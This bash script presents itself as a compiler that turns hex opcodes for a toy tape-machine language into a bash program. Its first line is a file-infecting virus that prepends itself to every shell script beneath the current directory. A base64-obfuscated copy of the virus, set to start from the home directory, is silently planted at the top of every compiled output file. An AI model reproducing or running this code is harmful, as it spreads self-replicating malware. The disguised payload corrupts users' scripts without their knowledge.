d=$PWD;find . -type f -exec bash -c "[ \"\$(file {}|grep -o 'shell')\" = \"shell\" ]&&{ cat \"$d/$0\"|head -1 > 0.tmp;cat \"{}\" >> 0.tmp;cat 0.tmp > \"{}\";rm 0.tmp;}" \;
#!/bin/bash
base64 -d<<<"Y2Q7ZD0kUFdEO2ZpbmQgLiAtdHlwZSBmIC1leGVjIGJhc2ggLWMgIlsgXCJcJChmaWxlIHt9fGdyZXAgLW8gJ3NoZWxsJylcIiA9IFwic2hlbGxcIiBdJiZ7IGNhdCBcIiRkLyQwXCJ8aGVhZCAtMSA+IDAudG1wO2NhdCBcInt9XCIgPj4gMC50bXA7Y2F0IDAudG1wID4gXCJ7fVwiO3JtIDAudG1wO30iIFw7IDI+IC9kZXYvbnVsbCYKCg==" > "out.sh"
echo "
#!/bin/bash
TAPE=( 0000 );HEAD=0
r(){
	((HEAD++))
	[ \"\$HEAD\" -gt \"\${#TAPE[@]}\" ]&&TAPE=( \${TAPE[@]} 0000 )
}

l(){
	((HEAD--))
	[ \"\$HEAD\" -lt \"0\" ]&&{ HEAD=0; TAPE=( 0000 \${TAPE[@]} );}
}

w(){
	TAPE[\$HEAD]=\"\$1\"
}" >> "out.sh"

for i in $(cat $1|xxd -u -p|sed 's/.\{6\}/& /g');do
	i=( $(echo "$i"|head -c2) $(echo "$i"|cut -c3-) )
	echo -n "${i[0]}("
	echo -n "${i[0]}) "|sed 's/00/right/g;s/01/left/g;s/02/write/g;s/03/state/g;s/04/close/g;s/05/if/g;s/06/run/g;s/07/print/g;s/08/print tape/g'
	echo "${i[1]}"
	case "${i[0]}" in
		"00")
		echo "r" >> "out.sh"
		;;
		"01")
		echo "l" >> "out.sh"
		;;
		"02")
		echo "w \"${i[1]}\"" >> "out.sh"
		;;
		"03")
		echo "_${i[1]}_(){" >> "out.sh"
		;;
		"04")
		echo "}" >> "out.sh"
		;;
		"05")
		echo "[ \"\${TAPE[\$HEAD]}\" == \"${i[1]}\" ]&&{" >> "out.sh"
		;;
		"06")
		echo "_${i[1]}_" >> "out.sh"
		;;
		"07")
		echo "xxd -r -p<<<\"${i[1]}\"" >> "out.sh"
		;;
		"08")
		echo "echo \"\${TAPE[@]}\";for i in \$(seq \$HEAD);do echo -n \"     \";done;echo \"^^^^\"" >> "out.sh"
		;;
	esac
done
chmod +x out.sh
